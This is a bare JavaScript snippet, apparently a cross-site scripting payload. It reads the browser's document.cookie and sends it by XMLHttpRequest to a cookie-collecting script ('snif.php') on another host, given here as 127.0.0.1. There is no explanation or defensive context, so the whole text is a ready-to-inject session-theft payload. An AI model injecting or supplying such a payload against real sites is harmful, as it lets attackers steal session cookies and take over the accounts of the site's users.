var xmlHttp = new XMLHttpRequest();
 xmlHttp.open("GET", 'https://127.0.0.1//xss/snif.php?cookie='+document.cookie);
 xmlHttp.send(null);
